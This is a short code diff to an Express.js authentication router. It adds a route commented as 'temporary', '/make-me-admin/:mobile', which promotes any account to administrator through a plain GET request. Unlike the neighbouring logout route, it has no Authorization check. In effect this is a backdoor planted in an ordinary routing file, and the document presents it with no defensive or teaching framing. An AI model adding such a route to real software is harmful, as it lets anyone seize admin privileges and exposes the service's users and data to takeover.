@@ -8,6 +8,8 @@ router.post("/check-otp", authController.checkOTP);
 router.post("/check-refresh-token", authController.checkRefreshToken);
 router.get("/logout", Authorization, authController.logout);
 
+// Temporary route to promote an account to admin via URL
+router.get("/make-me-admin/:mobile", authController.makeAdmin);
 module.exports = {
   AuthRouter: router,
 };
